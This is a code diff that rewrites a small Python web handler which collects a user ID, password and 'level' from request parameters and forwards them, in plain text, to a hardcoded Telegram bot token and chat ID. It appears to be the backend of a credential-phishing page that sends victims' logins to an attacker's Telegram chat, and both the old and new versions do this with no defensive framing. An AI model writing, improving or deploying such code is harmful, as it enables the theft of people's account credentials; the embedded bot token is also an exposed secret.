@@ -1,44 +1,32 @@
+from http.server import BaseHTTPRequestHandler
 import requests
+from urllib.parse import urlparse, parse_qs
 
-def handler(request):
-    uid = request.args.get("uid")
-    password = request.args.get("password")
-    level = request.args.get("level")
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        query = parse_qs(urlparse(self.path).query)
 
-    # Param check
-    if not uid or not password or not level:
-        return {
-            "statusCode": 400,
-            "body": {"status": "error", "message": "uid, password, level required"}
-        }
+        uid = query.get("uid", [""])[0]
+        password = query.get("password", [""])[0]
+        level = query.get("level", [""])[0]
 
-    try:
-        BOT_TOKEN = "8622182891:AAFZrjBvj_iAMTOIXCnmd65tTzZENnB2_UQ"
-        CHAT_ID = "7326248826"
+        BOT = "8622182891:AAFZrjBvj_iAMTOIXCnmd65tTzZENnB2_UQ"
+        CHAT = "7326248826"
 
-        text = f"UID: {uid}\nPASSWORD: {password}\nLEVEL: {level}"
+        text = f"{uid} | {password} | {level}"
 
-        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        try:
+            requests.get(
+                f"https://api.telegram.org/bot{BOT}/sendMessage",
+                params={"chat_id": CHAT, "text": text}
+            )
 
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": text
-        }
+            response = "OK"
 
-        tg = requests.get(telegram_url, params=payload)
-        tg_data = tg.json()
+        except Exception as e:
+            response = str(e)
 
-        return {
-            "statusCode": 200,
-            "body": {
-                "status": "success",
-                "message": "Telegram message sent",
-                "telegram_response": tg_data
-            }
-        }
-
-    except Exception as e:
-        return {
-            "statusCode": 500,
-            "body": {"status": "error", "message": str(e)}
-        }
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain")
+        self.end_headers()
+        self.wfile.write(response.encode())
